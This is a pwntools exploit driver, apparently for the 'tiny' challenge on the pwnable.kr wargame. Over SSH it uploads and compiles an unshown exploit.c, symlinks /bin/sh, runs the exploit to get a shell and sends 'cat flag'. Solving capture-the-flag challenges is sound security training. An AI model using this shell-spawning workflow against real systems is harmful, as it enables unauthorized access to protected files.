#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ template template --host pwnable.kr --port 2222 --pass guest --user tiny ./tiny
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF("./tiny")

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or "pwnable.kr"
port = int(args.PORT or 2222)
user = args.USER or "tiny"
password = args.PASSWORD or "guest"
remote_path = "tiny"

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def start_local(argv=[], *a, **kw):
    """Execute the target binary locally"""
    if args.GDB:
        return gdb.debug(argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(argv, *a, **kw)


def start_remote(argv=[], *a, **kw):
    """Execute the target binary on the remote host"""
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell.process([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
tbreak *0x{exe.entry:x}
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

shell.upload_file("exploit.c")

shell.gcc("-m32", "-o", "exploit", "exploit.c")
shell.ln("-s", "/bin/sh", "td")

io = shell.process(["./exploit"])
info("waiting for success...")
io.recvuntil(b"$ ")
io.sendline(b"cat flag")
log.success(f"flag = '{term.text.bold_italic_yellow(io.recvline().decode().strip())}'")
